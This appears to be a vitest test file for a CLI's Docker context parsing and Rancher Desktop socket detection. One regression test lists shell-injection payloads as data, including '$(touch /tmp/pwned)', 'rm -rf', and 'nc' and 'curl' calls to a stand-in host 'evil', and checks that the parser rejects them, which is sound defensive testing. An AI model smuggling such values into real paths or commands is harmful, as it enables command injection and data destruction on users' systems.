import { describe, it, expect } from 'vitest';

// The pure helpers for Rancher Desktop detection live in the CLI (cli/src/
// runtime.ts), but the CLI has no test runner of its own. Gateway runs vitest
// (and that is what CI executes), so we test the parsing here. Only pure
// functions without a daemon dependency — no live docker needed.
import { parseDockerContextSocket, isRancherDesktopSocket, dockerMountSocket } from '../../cli/src/runtime';

describe('parseDockerContextSocket (#81)', () => {
  it('extracts the unix socket path from the rancher-desktop context', () => {
    const json = JSON.stringify([
      {
        Name: 'rancher-desktop',
        Endpoints: { docker: { Host: 'unix:///home/toon/.rd/docker.sock', SkipTLSVerify: false } },
      },
    ]);
    expect(parseDockerContextSocket(json)).toBe('/home/toon/.rd/docker.sock');
  });

  it('also extracts the path from the default docker context', () => {
    const json = JSON.stringify([
      { Name: 'default', Endpoints: { docker: { Host: 'unix:///var/run/docker.sock' } } },
    ]);
    expect(parseDockerContextSocket(json)).toBe('/var/run/docker.sock');
  });

  it('also accepts a single object instead of an array', () => {
    const json = JSON.stringify({ Endpoints: { docker: { Host: 'unix:///run/user/1000/docker.sock' } } });
    expect(parseDockerContextSocket(json)).toBe('/run/user/1000/docker.sock');
  });

  it('returns null for a non-unix endpoint (Windows npipe)', () => {
    const json = JSON.stringify([
      { Endpoints: { docker: { Host: 'npipe:////./pipe/docker_engine' } } },
    ]);
    expect(parseDockerContextSocket(json)).toBeNull();
  });

  it('returns null for a remote tcp/ssh endpoint', () => {
    const json = JSON.stringify([{ Endpoints: { docker: { Host: 'tcp://1.2.3.4:2375' } } }]);
    expect(parseDockerContextSocket(json)).toBeNull();
  });

  it('returns null for unparsable or incomplete JSON', () => {
    expect(parseDockerContextSocket('not json')).toBeNull();
    expect(parseDockerContextSocket('[]')).toBeNull();
    expect(parseDockerContextSocket('[{}]')).toBeNull();
    expect(parseDockerContextSocket(JSON.stringify([{ Endpoints: {} }]))).toBeNull();
  });

  // Regression (#81, security): the path is interpolated into a `docker run -v
  // "<path>:..."` shell command where it is double-quoted. An attacker-influenceable
  // docker context must not smuggle in metacharacters that stay active inside double
  // quotes ($, backtick, \) or command separators -> command injection.
  it('rejects paths with shell metacharacters (command injection)', () => {
    const payloads = [
      'unix:///tmp/$(touch /tmp/pwned)/.rd/docker.sock',
      'unix:///tmp/`id`/.rd/docker.sock',
      'unix:///tmp/x;rm -rf ~/.rd/docker.sock',
      'unix:///tmp/x|nc evil 1/.rd/docker.sock',
      'unix:///tmp/x && curl evil/.rd/docker.sock',
      'unix:///tmp/x\n/.rd/docker.sock',
      'unix:///tmp/$HOME/.rd/docker.sock',
      'unix:///tmp/x"y/.rd/docker.sock',
      'unix:///tmp/x\\y/.rd/docker.sock',
    ];
    for (const host of payloads) {
      const json = JSON.stringify([{ Endpoints: { docker: { Host: host } } }]);
      expect(parseDockerContextSocket(json), host).toBeNull();
    }
  });

  it('accepts a path with spaces (legal home dir, e.g. macOS) — it is double-quoted at the sink', () => {
    const json = JSON.stringify([
      { Endpoints: { docker: { Host: 'unix:///Users/First Last/.rd/docker.sock' } } },
    ]);
    expect(parseDockerContextSocket(json)).toBe('/Users/First Last/.rd/docker.sock');
  });

  it('leaves ordinary (safe) absolute socket paths untouched', () => {
    const json = JSON.stringify([
      { Endpoints: { docker: { Host: 'unix:///home/toon/.rd/docker.sock' } } },
    ]);
    expect(parseDockerContextSocket(json)).toBe('/home/toon/.rd/docker.sock');
  });
});

describe('isRancherDesktopSocket (#81)', () => {
  it('recognizes the rancher-desktop socket path', () => {
    expect(isRancherDesktopSocket('/home/toon/.rd/docker.sock')).toBe(true);
    expect(isRancherDesktopSocket('/Users/toon/.rd/docker.sock')).toBe(true);
  });

  it('does not recognize ordinary docker sockets as Rancher Desktop', () => {
    expect(isRancherDesktopSocket('/var/run/docker.sock')).toBe(false);
    expect(isRancherDesktopSocket('/run/user/1000/docker.sock')).toBe(false);
    expect(isRancherDesktopSocket(undefined)).toBe(false);
    expect(isRancherDesktopSocket(null)).toBe(false);
  });
});

// Regression: the Rancher Desktop context socket (~/.rd/docker.sock) is a
// host-side forwarder into the VM. Mounting it made dockerd (inside the VM) try
// to mkdir it: "operation not supported". Always mount the engine-side socket.
describe('dockerMountSocket', () => {
  it('mounts the VM-side socket for Rancher Desktop on macOS, not ~/.rd/docker.sock', () => {
    expect(dockerMountSocket('/Users/x/.rd/docker.sock', 'darwin'))
      .toEqual({ socketPath: '/var/run/docker.sock', isRemote: true });
  });

  it('mounts the VM-side socket for Rancher Desktop on Linux and treats it as remote', () => {
    expect(dockerMountSocket('/home/x/.rd/docker.sock', 'linux'))
      .toEqual({ socketPath: '/var/run/docker.sock', isRemote: true });
  });

  it('keeps native Docker on Linux local', () => {
    expect(dockerMountSocket('/var/run/docker.sock', 'linux'))
      .toEqual({ socketPath: '/var/run/docker.sock', isRemote: false });
  });

  it('uses the Windows-style engine path when no unix context socket exists (npipe)', () => {
    expect(dockerMountSocket(undefined, 'win32'))
      .toEqual({ socketPath: '//var/run/docker.sock', isRemote: true });
  });
});
